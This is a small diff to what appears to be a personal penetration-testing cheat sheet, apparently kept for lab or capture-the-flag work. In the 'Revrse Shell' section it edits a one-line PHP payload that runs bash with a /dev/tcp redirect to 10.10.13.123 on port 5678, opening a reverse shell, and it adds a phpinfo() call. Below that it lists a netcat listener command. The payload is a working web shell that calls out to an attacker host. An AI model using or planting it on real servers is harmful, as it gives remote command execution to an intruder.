@@ -120,7 +120,7 @@ File Transfer
 
 Revrse Shell
   Link: https://blog.barradell-johns.com/index.php/2018/12/30/reverse-shell-cheat-sheet/
-    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.123/5678 0>&1'"); ?>
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.123/5678 0>&1'");phpinfo();?>
   
 NetCat
   Listener: nc -lvnp 5555
